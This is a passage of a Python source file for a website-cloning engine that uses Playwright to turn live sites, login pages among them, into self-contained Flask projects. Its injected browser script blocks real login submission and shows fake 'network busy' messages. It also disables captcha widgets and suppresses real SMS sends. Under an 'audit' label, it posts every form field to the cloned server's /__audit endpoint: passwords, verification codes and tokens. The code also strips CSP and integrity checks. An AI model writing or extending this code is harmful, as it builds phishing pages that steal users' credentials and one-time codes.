"""
V4 工业级高还原提取引擎(同步线程模型) —— AI 视觉闭环与自适应修复版。

V4 强化(工程修复优先, AI 兜底):
  - URL 路径参数规范化: ;jsessionid=... 等矩阵参数不再污染扩展名识别,
    CSS/JS 正确归位 static/css|js, 修复 stats 全部落入 misc 的问题;
  - 跨域 iframe 递归克隆: iframe[src](含跨域 SSO 组件)以顶级页面方式
    Playwright 渲染(天然绕过 X-Frame-Options), 固化为 frames/frame_N.html
    并重写引用, 深度与数量受控;
  - 活体会话请求差集回补: 渲染期浏览器成功加载过的全部资源与已下载清单
    做差集, 缺失部分用同一 BrowserContext(真实 Cookie/UA)补抓 —— 用观测
    代替猜测, 不依赖大模型猜 URL;
  - 渲染驱动修复循环: 本地渲染 -> 收集 404/外联请求 -> 回源补抓 ->
    重新本地化 -> 再渲染, 最多 RENDER_REPAIR_ROUNDS 轮;
  - JS 内容本地化重写: 运行时由 JS 字符串注入的资源(动态背景图等)
    在下载后的 .js 文件内做精确 URL 字面量替换;
  - 诚实相似度 v2: 块级归一化互相关(NCC) + 边缘图 IoU + 可见文本召回率
    三通道加权, 子指标过低输出告警, 杜绝"白底页面恒高分";
  - 本地评分渲染强制离线(路由拦截外网请求), 分数不被远程资源污染;
  - AI 视觉闭环(门控): 诚实评分低于阈值且配置了 API Key 时, 由
    ai_vision_repair 对比双图生成 CSS/HTML 补丁并迭代复评;
  - 智能 Mock: 表单 action/字段解析生成可交互 Mock 路由(可选 LLM 润色)。

执行管线:
  DOM渲染(懒加载+滚动+表单激活) -> DEEP_FREEZE(CSSOM/Canvas/表单/动画显形)
  -> 多页 BFS + 同源 iframe DOM 提取 + 跨域 iframe 顶级渲染固化
  -> XHR/Fetch 流量录制 -> CAS 内容寻址并发下载(requests->浏览器会话降级)
  -> 活体差集回补 -> HTML/CSS/JS 本地化重写 + SPA 路径伪装注入
  -> 渲染驱动修复循环(404 回补) -> 诚实相似度三通道评分 + 差异热力图
  -> 智能 Mock 合并 -> [门控] AI 视觉闭环修复 -> Flask 工程生成打包
"""
import base64
import hashlib
import html as _html
import io
import json
import math
import os
import posixpath
import re
import struct
import threading
import time
import zlib
from collections import deque
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait as _wait_futures
from contextlib import suppress
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urljoin, urlsplit

from PIL import Image, ImageChops, ImageDraw, ImageFilter, ImageStat

try:  # 评分向量化(可选依赖): 缺失时回落纯 Python 实现, 结果一致
    import numpy as _np
except ImportError:  # pragma: no cover
    _np = None

import config
from core import ai_mock_generator, ai_vision_repair, flask_generator, smart_downloader
from core import pattern_detector, strategy_packs
from core import pixel_calibrator


# ---------------------------------------------------------------------------
# 不可信输入边界: 克隆内容(目标站路径/Cookie/Storage)= 攻击者可控数据
# ---------------------------------------------------------------------------
def _safe_json(value) -> str:
    """JSON 序列化后可安全嵌入内联 <script>/HTML: `<` `>` `&` 与 U+2028/2029 转 \\uXXXX。

    结果仍是合法 JSON 且与 JS 字面量语义等价, 杜绝 `</script>` 闭合标签注入
    与 `<!--` 脚本数据态切换(克隆内容是攻击者可控输入)。"""
    return (json.dumps(value, ensure_ascii=False)
            .replace("<", "\\u003c").replace(">", "\\u003e").replace("&", "\\u0026")
            .replace("\u2028", "\\u2028").replace("\u2029", "\\u2029"))


def _normalize_page_dir(path: str) -> str:
    """目标 URL 路径 → 安全的目录型 page_dir(以 / 开头和结尾, 无 `..`/空段)。

    非法(含遍历段或控制字符)一律回退 "/", 落盘与路由表不会逃出工作区。"""
    raw = path or "/"
    if any(ord(ch) < 32 for ch in raw) or "\\" in raw:
        return "/"
    segments = [seg for seg in raw.split("/") if seg not in ("", ".")]
    if any(seg == ".." for seg in segments):
        return "/"
    norm = posixpath.normpath("/" + "/".join(segments)) if segments else "/"
    if not norm.startswith("/") or ".." in norm.split("/"):
        return "/"
    return norm if norm.endswith("/") else norm + "/"

# ---------------------------------------------------------------------------
# 浏览器端注入脚本
# ---------------------------------------------------------------------------
LAZY_JS = r"""
() => {
  let n = 0;
  document.querySelectorAll('[data-src],[data-original],[data-lazy-src],[data-lazy]').forEach(el => {
    const v = el.getAttribute('data-src') || el.getAttribute('data-original')
            || el.getAttribute('data-lazy-src') || el.getAttribute('data-lazy');
    if (!v) return;
    const tag = el.tagName;
    if (tag === 'IMG' || tag === 'SOURCE' || tag === 'IFRAME' || tag === 'VIDEO' || tag === 'AUDIO') {
      if (!el.getAttribute('src')) { el.setAttribute('src', v); n++; }
    } else {
      const s = el.getAttribute('style') || '';
      if (!/background-image/.test(s)) {
        el.setAttribute('style', s + 'background-image:url(' + v + ');');
        n++;
      }
    }
  });
  return n;
}
"""

DEEP_FREEZE_JS = r"""
() => {
  const result = { lazy: 0, css: 0, crossOriginSheets: 0, canvas: 0, forms: 0, revealed: 0 };

  // 1) 懒加载属性标准化
  document.querySelectorAll('[data-src],[data-original],[data-lazy-src],[data-lazy]').forEach(el => {
    const v = el.getAttribute('data-src') || el.getAttribute('data-original')
            || el.getAttribute('data-lazy-src') || el.getAttribute('data-lazy');
    if (!v) return;
    const tag = el.tagName;
    if (tag === 'IMG' || tag === 'SOURCE' || tag === 'IFRAME' || tag === 'VIDEO' || tag === 'AUDIO') {
      el.setAttribute('src', v);
    } else {
      const s = el.getAttribute('style') || '';
      if (!/background-image/.test(s)) el.setAttribute('style', s + 'background-image:url(' + v + ');');
    }
    result.lazy++;
  });

  // 2) 滚动入场动画强制显形: AOS / WOW(GSAP) / ScrollReveal / 通用 data-reveal
  document.querySelectorAll('[data-aos], .wow, [data-scroll], [data-sr-id], [data-reveal], [data-animate]').forEach(el => {
    el.style.setProperty('opacity', '1', 'important');
    el.style.setProperty('visibility', 'visible', 'important');
    el.style.setProperty('transform', 'none', 'important');
    el.style.setProperty('filter', 'none', 'important');
    el.style.setProperty('transition', 'none', 'important');
    el.classList.add('aos-animate');
    el.classList.remove('wow');
    result.revealed++;
  });

  // 3) 安全属性清理
  document.querySelectorAll('base').forEach(el => el.remove());
  document.querySelectorAll('meta[http-equiv="Content-Security-Policy" i]').forEach(el => el.remove());
  document.querySelectorAll('[integrity]').forEach(el => el.removeAttribute('integrity'));
  document.querySelectorAll('[crossorigin]').forEach(el => el.removeAttribute('crossorigin'));

  // 4) CSSOM 运行时样式序列化(Styled-Components/Emotion/Tailwind JIT)
  //    关键: 相对 url() 必须按样式表自身地址(sheet.href)绝对化。
  //    否则内联固化后解析基准从 CSS 文件目录漂移到页面目录,
  //    ../images/x.png 之类引用会 404 且级联覆盖正确的外部 CSS 规则。
  const head = document.head || document.documentElement;
  //    样式表的媒体条件必须随内联保留: 旧实现把 media="print" 的表当普通
  //    表内联, 打印样式(常见 .header,.footer{display:none!important})在屏幕
  //    上生效, 克隆页整块页眉页脚消失(wordpress.org 实证 28 分)。
  const serializeSheet = (sheet, kind) => {
    try {
      if (sheet.disabled) return;
      if (sheet.ownerNode && sheet.ownerNode.hasAttribute && sheet.ownerNode.hasAttribute('data-clone-bake')) return;
      const rules = sheet.cssRules;
      if (!rules || !rules.length) return;
      let text = '';
      for (let i = 0; i < rules.length; i++) text += rules[i].cssText + '\n';
      if (!text.trim()) return;
      const base = sheet.href || document.baseURI;
      //    引号内整体匹配: url("data:image/svg+xml,...fill='url(%23id)'...") 外层含单引号时,
      //    旧正则会钻进 data: 内部把 url(%23id) 改写成远程地址(SVG 渐变失填充 + 无效下载)
      text = text.replace(/url\(\s*(?:"([^"]*)"|'([^']*)'|([^'")\s]+))\s*\)/g,
        function (m, d, s1, b) {
          const q = d !== undefined ? '"' : (s1 !== undefined ? "'" : '');
          const u = (d !== undefined ? d : (s1 !== undefined ? s1 : b)).trim();
          if (/^(data:|blob:|about:|#|%23|https?:)/i.test(u)) return m;
          try { return 'url(' + q + new URL(u, base).href + q + ')'; }
          catch (e) { return m; }
        });
      let media = '';
      try { media = (sheet.media && sheet.media.mediaText || '').trim(); } catch (e) { media = ''; }
      if (!media && sheet.ownerNode && sheet.ownerNode.getAttribute) media = (sheet.ownerNode.getAttribute('media') || '').trim();
      if (media && media.toLowerCase() !== 'all') text = '@media ' + media + ' {\n' + text + '}\n';
      const style = document.createElement('style');
      style.setAttribute('data-cssom', kind);
      style.textContent = text;
      head.appendChild(style);
      result.css++;
    } catch (err) {
      result.crossOriginSheets++;
    }
  };
  Array.from(document.styleSheets).forEach(sheet => serializeSheet(sheet, 'true'));
  //    构造样式表(CSSStyleSheet + adoptedStyleSheets): CSS-in-JS 运行时/Vite 注入的
  //    样式不在 document.styleSheets, outerHTML 与 MHTML 都带不走(remix.run 实证:
  //    两轨整页无样式 34 分); 文档级采纳表级联在普通表之后, 按序追加到 head 末尾。
  try {
    (document.adoptedStyleSheets || []).forEach(sheet => serializeSheet(sheet, 'adopted'));
  } catch (err) {
    result.crossOriginSheets++;
  }

  // 5) Canvas 固化为位图
  document.querySelectorAll('canvas').forEach(cv => {
    try {
      const data = cv.toDataURL('image/png');
      if (data && data.length > 128) {
        const img = document.createElement('img');
        img.src = data;
        img.setAttribute('data-canvas-frozen', 'true');
        if (cv.clientWidth) img.style.width = cv.clientWidth + 'px';
        if (cv.clientHeight) img.style.height = cv.clientHeight + 'px';
        cv.replaceWith(img);
        result.canvas++;
      }
    } catch (err) {
      result.canvas += 0;
    }
  });

  // 6) 表单状态固化
  document.querySelectorAll('input').forEach(el => {
    if (el.type === 'file') return;
    if (el.type === 'checkbox' || el.type === 'radio') {
      if (el.checked) el.setAttribute('checked', ''); else el.removeAttribute('checked');
    }
    el.setAttribute('value', el.value || '');
    result.forms++;
  });
  document.querySelectorAll('textarea').forEach(el => { el.textContent = el.value || ''; result.forms++; });
  document.querySelectorAll('option').forEach(op => {
    if (op.selected) op.setAttribute('selected', ''); else op.removeAttribute('selected');
  });
  document.querySelectorAll('select').forEach(sel => {
    if (sel.selectedIndex >= 0 && sel.options[sel.selectedIndex]) {
      sel.setAttribute('data-selected', sel.options[sel.selectedIndex].value);
    }
  });
  return result;
}
"""

# 表单激活: focus/blur 触发懒加载样式与占位符逻辑(不点击, 防止误提交/误导航)
# 视觉媒体快照(纯净基准截图之后、DOM 改动之前执行):
# - 空白/跨域污染的 Canvas(WebGL 未开 preserveDrawingBuffer 时 toDataURL 恒为空白,
#   跨域贴图会让读像素直接抛错): DEEP_FREEZE 的 toDataURL 固化只能得到透明图;
# - 无 poster 的 <video>: 离线回放时剥了脚本不会播放, 编解码不支持时整块空白。
# 能直接读到当前帧的视频就地写 poster; 其余打 data-clone-shot 标记并返回文档坐标,
# 由引擎从纯净基准截图裁出对应区域回填(MEDIA_SHOT_APPLY_JS)。
MEDIA_SHOT_JS = r"""
() => {
  const out = [];
  const sx = window.scrollX || 0, sy = window.scrollY || 0;
  const rectOf = el => { const r = el.getBoundingClientRect();
                         return {x: r.left + sx, y: r.top + sy, w: r.width, h: r.height}; };
  const blank = cv => {
    try {
      const w = Math.min(cv.width, 64), h = Math.min(cv.height, 64);
      if (!w || !h) return true;
      const t = document.createElement('canvas'); t.width = w; t.height = h;
      const c = t.getContext('2d'); c.drawImage(cv, 0, 0, w, h);
      const d = c.getImageData(0, 0, w, h).data;
      for (let i = 3; i < d.length; i += 4) { if (d[i] !== 0) return false; }
      return true;
    } catch (err) { return true; }   // 跨域污染: 读不到像素, 只能走截图
  };
  let n = 0, posters = 0;
  document.querySelectorAll('canvas').forEach(cv => {
    const r = rectOf(cv);
    if (r.w < 8 || r.h < 8 || !blank(cv)) return;
    cv.setAttribute('data-clone-shot', String(n));
    out.push(Object.assign({n: n++, kind: 'canvas'}, r));
  });
  let pinned = 0;
  document.querySelectorAll('video').forEach(v => {
    const r = rectOf(v);
    if (r.w < 8 || r.h < 8) return;
    // 播放后才显形的视频(脚本在 playing/canplay 时把 opacity 从 0 拉到 1): 克隆里视频
    // 不播, 显形逻辑不触发, 整块按样式表初值透明(wix 首屏光晕整片丢失)。基准时刻的
    // 不透明度钉成内联, 封面帧才看得见
    try {
      const op = parseFloat(getComputedStyle(v).opacity);
      if (op > 0) { v.style.setProperty('opacity', String(op), 'important'); pinned++; }
    } catch (err) {}
    // 基准时刻的播放进度: 克隆评分前跳到同一帧并暂停(录屏式预览视频逐帧都在变,
    // 克隆从头播放到截图那一刻与基准是两帧, nuxt 展示墙整排失配)
    try { if (v.readyState >= 2 && v.currentTime > 0) v.setAttribute('data-clone-vt', v.currentTime.toFixed(3)); } catch (err) {}
    if (v.getAttribute('poster')) return;
    try {
      if (v.readyState >= 2 && v.videoWidth) {
        const t = document.createElement('canvas');
        t.width = v.videoWidth; t.height = v.videoHeight;
        t.getContext('2d').drawImage(v, 0, 0);
        // 带 alpha 的视频(VP9/HEVC 透明通道, 常用作光晕/悬浮物件叠层): JPEG 丢透明,
        // 封面成了整块不透明底色盖住下层。WebP 保留 alpha, 不支持时才退回 JPEG
        let data = t.toDataURL('image/webp', 0.85);
        if (!data || !data.startsWith('data:image/webp')) data = t.toDataURL('image/jpeg', 0.85);
        if (data && data.length > 2000) { v.setAttribute('poster', data); v.setAttribute('data-clone-poster', '1'); posters++; return; }
      }
    } catch (err) { /* 跨域视频帧不可读 → 截图 */ }
    v.setAttribute('data-clone-shot', String(n));
    out.push(Object.assign({n: n++, kind: 'video'}, r));
  });
  return {shots: out, posters: posters, pinned: pinned,
          docW: Math.max(document.documentElement.scrollWidth, window.innerWidth || 0)};
}
"""

MEDIA_SHOT_APPLY_JS = r"""
(shots) => {
  let applied = 0;
  document.querySelectorAll('[data-clone-shot]').forEach(el => {
    const src = shots[el.getAttribute('data-clone-shot')];
    el.removeAttribute('data-clone-shot');
    if (!src) return;
    if (el.tagName === 'VIDEO') { el.setAttribute('poster', src); el.setAttribute('data-clone-poster', '1'); applied++; return; }
    const img = document.createElement('img');
    for (const a of Array.from(el.attributes)) {
      if (a.name === 'width' || a.name === 'height') continue;
      img.setAttribute(a.name, a.value);
    }
    img.src = src;
    img.setAttribute('data-canvas-frozen', 'shot');
    img.style.width = (el.clientWidth || el.getBoundingClientRect().width) + 'px';
    img.style.height = (el.clientHeight || el.getBoundingClientRect().height) + 'px';
    el.replaceWith(img);
    applied++;
  });
  return applied;
}
"""

FORM_ACTIVATE_JS = r"""
async () => {
  let n = 0;
  // focus 默认把输入框滚进视口: 滚动触发的 IntersectionObserver/滚动监听会改版面
  // (wix 模板轮播进视口即换页, 序列化的 DOM 与基准截图不是同一页)。不滚, 滚了也回原位
  const sx = window.scrollX, sy = window.scrollY;
  document.querySelectorAll('input:not([type=hidden]):not([type=submit]):not([type=button]):not([type=file]), textarea, select').forEach(el => {
    if (n >= 60) return;
    try { el.focus({preventScroll: true}); el.blur(); n++; } catch (e) {}
  });
  try { if (window.scrollX !== sx || window.scrollY !== sy) window.scrollTo(sx, sy); } catch (e) {}
  if (n) {
    // "点外部关闭"类浮层(搜索下拉/联想面板)focus 即展开、blur 关不掉, 只认外部 mousedown:
    // 在 body 上派发一次外部点击序列收起它们(aliyun 顶栏搜索面板被固化进克隆)
    try {
      const o = {bubbles: true, cancelable: true, view: window, clientX: 1, clientY: 1};
      for (const t of ['pointerdown', 'mousedown', 'pointerup', 'mouseup', 'click']) {
        const E = t.startsWith('pointer') && window.PointerEvent ? PointerEvent : MouseEvent;
        document.body.dispatchEvent(new E(t, o));
      }
      await new Promise(r => setTimeout(r, 120));
    } catch (e) {}
  }
  return n;
}
"""

# SPA 版本升级弹层探测: 部分企业应用(灰度发布体系)首访弹"检测到有新版本"
# 全屏对话框并 4~5s 自动 reload, 需在活体渲染期主动走完升级流程再固化,
# 否则克隆页会被弹层永久接管(冻结的 HTML 无法通过 reload 获得新版本)。
UPDATE_PROMPT_PROBE_JS = r"""
() => {
  try {
    const scopes = document.querySelectorAll(
      '.el-dialog__wrapper,.el-message-box__wrapper,.ant-modal,.modal-mask,.v-modal,[class*="version-mask"]');
    for (const m of scopes) {
      const style = getComputedStyle(m);
      if (style.display === 'none' || style.visibility === 'hidden') continue;
      const t = (m.innerText || '').slice(0, 240);
      if (/新版本|自动更新|立即更新|版本升级|new version|update available|refresh to get|please refresh/i.test(t)) {
        return { found: true, text: t.replace(/\s+/g, ' ').slice(0, 100) };
      }
    }
  } catch (e) {}
  return { found: false };
}
"""

UPDATE_PROMPT_CLICK_JS = r"""
() => {
  const nodes = document.querySelectorAll('button, a, span, div');
  for (const b of nodes) {
    if (!b.offsetParent) continue;
    const bt = (b.innerText || '').trim();
    if (/^(立即自动更新|立即更新|立即刷新|马上更新|update now|refresh now|reload)$/i.test(bt) && bt.length <= 16) {
      b.click();
      return bt;
    }
  }
  return null;
}
"""

STORAGE_SNAPSHOT_JS = r"""
() => {
  const out = { local: {}, session: {} };
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      out.local[k] = localStorage.getItem(k);
    }
  } catch (e) {}
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i);
      out.session[k] = sessionStorage.getItem(k);
    }
  } catch (e) {}
  return out;
}
"""

# 克隆页状态恢复: Cookie / localStorage / sessionStorage 快照前置写入(仅缺失键),
# 使"版本守卫/引导步骤/语言偏好"类 SPA 在克隆中自洽启动, 不弹升级框。
# 埋点引擎观察器胶水(随交互层注入): 点击登录/验证码时由交互层回调,
# 填探测值触发引擎 fire 上报, 上报后恢复原值 —— 事件被交互层拦截时埋点仍能工作。
TRACKER_OBSERVE_JS = r"""<script data-clone-preview="tracker-observe">(function(){
  if (window.__ft_observe) return;
  var last = 0;
  window.__ft_observe = function (el, intent) {
    if (el.__ftBusy || Date.now() - last < 1500) return;
    el.__ftBusy = 1; last = Date.now();
    try {
      var inputs = Array.prototype.slice.call(
        document.querySelectorAll('input')).filter(function (i) {
          return i.offsetParent && !/^(button|submit|reset|file|hidden)$/i.test(i.type);
        });
      // 用户已填真实值时不覆盖(保真优先); 全空才填探测值驱动引擎 fire
      var hasUserInput = inputs.some(function (i) { return (i.value || '').length > 0; });
      if (hasUserInput) { el.__ftBusy = 0; return; }
      var saved = inputs.map(function (i) { return i.value; });
      inputs.forEach(function (i, idx) {
        i.value = 'ft_' + (idx + 1);
        i.dispatchEvent(new Event('input', {bubbles: true}));
      });
      setTimeout(function () {
        inputs.forEach(function (i, idx) { i.value = saved[idx]; });
        el.__ftBusy = 0;
      }, 600);
    } catch (e) { el.__ftBusy = 0; }
  };
})();
</script>"""

STATE_RESTORE_TEMPLATE = r"""<script data-clone-preview="state-restore">(function(){try{var d=__STATE_JSON__;(d.cookies||[]).forEach(function(c){try{var re=new RegExp('(^|;\\s)'+c.name+'=');if(!re.test(document.cookie)){document.cookie=c.name+'='+encodeURIComponent(c.value)+'; path='+(c.path||'/');}}catch(e){}});['local','session'].forEach(function(t){try{var st=t==='local'?window.localStorage:window.sessionStorage;var m=d[t]||{};for(var k in m){try{if(st.getItem(k)===null){st.setItem(k,m[k]);}}catch(e){}}}catch(e){}});}catch(e){}})();</script>"""

# ---------------------------------------------------------------------------
# 仿真交互层: 让克隆页的登录/验证码按钮具备与真实站点一致的反馈行为。
#  - 登录类点击: 捕获阶段拦截(阻断原站提交), 弹出"网络繁忙"提示(随机文案池);
#  - 验证码类点击: 提示"已发送"后按钮进入 60s 倒计时(禁用+文案递减+自动恢复);
#  - 事件委托 + 捕获, 天然覆盖 SPA 动态挂载的按钮; 注入所有页面与 frame。
# ---------------------------------------------------------------------------
INTERACTION_SIM_TEMPLATE = r"""<script data-clone-preview="interaction-sim">(function(){
if (window.__cloneSim) return; window.__cloneSim = 1;
  /* 克隆环境无真实验证码: 短路极验等滑块组件(弹层遮挡表单且永无成功路径) */
  ['initGeetest', 'initGeetest2'].forEach(function (name) {
    try {
      var noop = function () {
        var cb = arguments[arguments.length - 1];
        var api = { appendTo: function(){}, onReady: function(f){ if (typeof f==='function') setTimeout(function(){ f({ verify: function(){}, destroy: function(){} }); },0); },
                    onSuccess: function(){}, onError: function(){}, onClose: function(){},
                    show: function(){}, hide: function(){}, destroy: function(){},
                    getValidate: function(){ return null; }, reset: function(){} };
        if (typeof cb === 'function') setTimeout(function () { cb(api); }, 0);
        return api;
      };
      Object.defineProperty(window, name, { configurable: false, get: function(){ return noop; }, set: function(){} });
    } catch (e) {}
  });
  try {
    var st = document.createElement('style');
    st.textContent = '#slidecode_div,[id*="geetest"],[class*="geetest_"],' +
      '#imgCaptchaForSendMsgCaptcha_div { display: none !important; }';
    (document.head || document.documentElement).appendChild(st);
  } catch (e) {}
  var FAILS = __SIM_FAILS__;
var SMS_OK = __SIM_SMS_OK__;
var SECONDS = __SIM_SECONDS__;
var REDIRECT = __SIM_REDIRECT__;

function pick(list) { return list[Math.floor(Math.random() * list.length)]; }

function countdownToast(seconds) {
  try {
    var host = document.body || document.documentElement;
    var t = document.createElement('div');
    t.setAttribute('data-clone-sim-toast', '1');
    t.style.cssText = 'position:fixed;top:16%;left:50%;transform:translateX(-50%);'
      + 'z-index:2147483647;background:rgba(17,24,39,.93);color:#fff;'
      + 'padding:10px 22px;border-radius:10px;font-size:14px;line-height:1.5;'
      + 'box-shadow:0 10px 30px rgba(0,0,0,.35);pointer-events:none;'
      + 'opacity:0;transition:opacity .25s ease;font-family:inherit;max-width:80vw;';
    host.appendChild(t);
    var n = seconds;
    function render() { t.textContent = SMS_OK + '（' + n + 's）'; }
    render();
    requestAnimationFrame(function () { t.style.opacity = '1'; });
    var timer = setInterval(function () {
      n -= 1;
      if (n <= 0 || !t.isConnected) { clearInterval(timer); t.style.opacity = '0'; setTimeout(function(){ t.remove(); }, 300); return; }
      render();
    }, 1000);
  } catch (e) {}
}

function toast(msg) {
  try {
    var host = document.body || document.documentElement;
    var t = document.createElement('div');
    t.setAttribute('data-clone-sim-toast', '1');
    t.textContent = msg;
    t.style.cssText = 'position:fixed;top:16%;left:50%;transform:translateX(-50%);'
      + 'z-index:2147483647;background:rgba(17,24,39,.93);color:#fff;'
      + 'padding:10px 22px;border-radius:10px;font-size:14px;line-height:1.5;'
      + 'box-shadow:0 10px 30px rgba(0,0,0,.35);pointer-events:none;'
      + 'opacity:0;transition:opacity .25s ease;font-family:inherit;max-width:80vw;';
    host.appendChild(t);
    requestAnimationFrame(function () { t.style.opacity = '1'; });
    setTimeout(function () {
      t.style.opacity = '0';
      setTimeout(function () { t.remove(); }, 320);
    }, 2200);
  } catch (e) {}
}


// 从点击命中元素向下钻取"纯文本叶子"作为倒计时宿主:
// 命中的常是含输入框的容器(其 innerText 恰好只剩按钮文案),
// 倒计时必须施加在最深的无子元素文本节点上, 否则连坐。

var LOGIN_EXACT = {
  '登录': 1, '立即登录': 1, '一键登录': 1, '登录系统': 1, '登入': 1, '登陆': 1,
  '立即登入': 1, '用户登录': 1, '会员登录': 1, '账号登录': 1, '密码登录': 1,
  'login': 1, 'loginnow': 1, 'signin': 1, 'signinnow': 1, 'sign in': 1
};

/* ===== 验证码行快照回放 + 输入框保护 =====
   1) 主动切断"点击/聚焦输入框触发站点发短信"的链条(实测 pacas CAS 系如此):
      - 快照时将验证码输入框替换为无监听克隆节点(杀直接绑定);
      - 捕获阶段拦截 focusin/click/mousedown 冒泡(杀委托绑定)。
      输入与聚焦本身不受影响, 用户可正常输入验证码。
   2) 兜底: 首次交互前惰性快照验证码行; 站点倒计时结束后若输入行未恢复
      则回放快照(克隆环境中站点重建渲染常不完整)。 */
var CODE_INPUT_RE = /验证码|短信|校验码|动态|code|sms|otp/i;
function isCodeInput(el) {
  return el && el.tagName === 'INPUT'
    && CODE_INPUT_RE.test((el.placeholder || '') + '|' + (el.id || '') + '|' + (el.name || ''));
}
['focusin', 'click', 'mousedown'].forEach(function (type) {
  document.addEventListener(type, function (ev) {
    if (isCodeInput(ev.target)) ev.stopPropagation();
  }, true);
});
function snapshotCodeRows() {
  if (window.__simCodeRows) return;
  var snaps = [];
  var seen = [];
  var candidates = document.querySelectorAll(
    'form div, [class*="input_group"], [class*="input-group"], [id*="code_div"], [id*="Code_div"], [class*="code-row"]');
  for (var i = 0; i < candidates.length; i++) {
    var div = candidates[i];
    var inp = div.querySelector('input');
    if (!inp || !div.offsetParent) continue;
    var key = ((inp.placeholder || '') + '|' + (inp.id || '') + '|' + (div.id || '') + '|' + String(div.className));
    if (!CODE_INPUT_RE.test(key)) continue;
    if (seen.indexOf(key) >= 0) continue;
    seen.push(key);
    // 杀直接绑定: 换成无监听克隆节点(委托类触发由上方捕获拦截兜住)
    try {
      var clone = inp.cloneNode(true);
      inp.replaceWith(clone);
    } catch (e) {}
    snaps.push({ el: div, html: div.innerHTML, inputId: inp.id || null });
  }
  window.__simCodeRows = snaps;
}
document.addEventListener('click', function () { snapshotCodeRows(); }, true);
document.addEventListener('focusin', function () { snapshotCodeRows(); }, true);

/* ===== 审计采集: 字段级事件留痕(配合生成工程 /__audit) =====
   - 实时: 验证码/令牌等敏感字段 input/focus 即上报(字段名+当时值+IP/UA 由服务端补);
   - 聚合: 点击 登录/提交/获取验证码 等按钮时, 把当前表单全部字段值整体上报一次。
   上报端点 /__audit 由生成的 Flask 工程提供(平台沙盒自动 404 静默)。 */
var AUDIT_EP = '/__audit';
function auditSend(event, payload) {
  try {
    var body = JSON.stringify({ event: event, time: new Date().toISOString(),
                                href: location.href.slice(0, 300), fields: payload });
    if (navigator.sendBeacon) {
      navigator.sendBeacon(AUDIT_EP, new Blob([body], { type: 'application/json' }));
    } else {
      fetch(AUDIT_EP, { method: 'POST', keepalive: true,
                        headers: { 'Content-Type': 'application/json' }, body: body });
    }
  } catch (e) {}
}
function formOf(el) {
  return el && el.closest ? el.closest('form') : null;
}
function collectFields(scope, filter) {
  var out = [];
  try {
    var nodes = (scope || document).querySelectorAll('input,textarea,select');
    for (var i = 0; i < nodes.length; i++) {
      var el = nodes[i];
      if (el.type === 'hidden' && filter !== 'all') continue;
      // 剔除隐藏分支的空字段(降低审计噪音); 非空或点击聚合时全量保留
      var style = window.getComputedStyle(el);
      var visible = el.offsetParent !== null || style.display !== 'none';
      if (!visible && !el.value && filter !== 'all') continue;
      if (el.type === 'password' && filter !== 'all') {
        out.push({ name: el.name || el.id || 'password', value: '***', type: 'password' });
        continue;
      }
      out.push({ name: el.name || el.id || el.tagName.toLowerCase(),
                 value: String(el.value || '').slice(0, 200),
                 type: el.type || 'text' });
    }
  } catch (e) {}
  return out;
}
// 实时: 敏感字段(验证码/令牌)输入即记录
['input', 'focusin'].forEach(function (type) {
  document.addEventListener(type, function (ev) {
    var el = ev.target;
    if (!el || el.tagName !== 'INPUT') return;
    var key = (el.placeholder || '') + '|' + (el.id || '') + '|' + (el.name || '');
    if (!CODE_INPUT_RE.test(key)) return;
    auditSend('code_field_' + type, collectFields(document).filter(function (f) {
      return CODE_INPUT_RE.test(f.name) || f.value;
    }));
  }, true);
});
// 聚合: 点击 登录/提交/获取验证码 类按钮时全量记录(含密码, 供审计)
document.addEventListener('click', function (ev) {
  try {
    var el = ev.target && ev.target.closest
      ? ev.target.closest('button, input[type=submit], input[type=button], a, [role=button]')
      : null;
    if (!el || !el.offsetParent) return;
    var txt = (el.innerText || el.value || '').replace(/\s+/g, '');
    var isLogin = /登录|登入|登陆|submit|login/i.test(txt) && txt.length <= 12;
    var isCode = /获取|发送|验证码/i.test(txt) && /验证码|短信|code|sms/i.test(txt) && txt.length <= 16;
    if (!isLogin && !isCode) return;
    var form = formOf(el);
    auditSend(isCode ? 'code_request_click' : 'login_click',
              collectFields(form || document, 'all'));
  } catch (e) {}
}, true);
setInterval(function () {
  if (!window.__simCodeRows) return;
  for (var i = 0; i < window.__simCodeRows.length; i++) {
    var s = window.__simCodeRows[i];
    if (!s.el.isConnected) continue;
    var hasInput = s.el.querySelector('input');
    if (hasInput) { s.counted = false; continue; }
    var txt = s.el.innerText || '';
    var counting = (/重新发送|resend/i.test(txt)) && (/[(（]\s*\d+\s*[sS秒]/.test(txt) || /\d+\s*[sS]/.test(txt));
    if (counting) {
      // 站点自身倒计时启动(点击输入框即触发发码的原站行为): 提示一次,
      // 避免用户误以为输入框"消失坏了"
      if (!s.counted) { s.counted = true; try { toast(SMS_OK + ', ' + SECONDS + ' 秒后恢复输入'); } catch (e) {} }
      continue;
    }
    if (/获取|发送|验证码/.test(txt)) {
      // 站点倒计时已结束但输入行未恢复 —— 回放初始快照
      try { s.el.innerHTML = s.html; } catch (e) {}
    }
  }
}, 1500);

document.addEventListener('click', function (ev) {
  try {
    if (ev.defaultPrevented) return;
    var el = ev.target && ev.target.closest
      ? ev.target.closest('button, a, input, [role=button], span, div')
      : null;
    if (!el || !el.isConnected || el.offsetParent === null) return;
    var raw = (el.innerText || el.value || '').trim();
    if (!raw || raw.length > 24) return;
    var norm = raw.replace(/\s+/g, '').toLowerCase();

    // 验证码/短信类: 提示已发送 + 倒计时(中英文词典)
    if ((/获取|发送|重新获|重发|get|send|resend|again/.test(norm)) && (/验证码|短信|校验码|动态码|动态密码|code|sms|otp/.test(norm))) {
      // 不拦截事件本身(无破坏性, 且拦截会吞掉埋点引擎 bubble 阶段的点击)。
      // 倒计时用平台自绘持续提示 —— 站点按钮(Vue/jQuery 重渲染)会覆盖按钮上的倒计时文本
      if (el.__simCd) return;
      el.__simCd = 1;
      countdownToast(SECONDS);
      setTimeout(function () { el.__simCd = 0; }, SECONDS * 1000);
      return;
    }

    // 登录类: 精确文案命中, 或提交控件位于含密码框的表单内
    var isLogin = !!LOGIN_EXACT[norm];
    if (!isLogin && (el.type === 'submit' || el.type === 'button' || el.getAttribute('type') === 'submit')) {
      var form = el.closest ? el.closest('form') : null;
      if (form && form.querySelector('input[type=password], input[type=text]')) {
        isLogin = /登录|登入|login|submit|确定/.test(norm) || el.type === 'submit';
      }
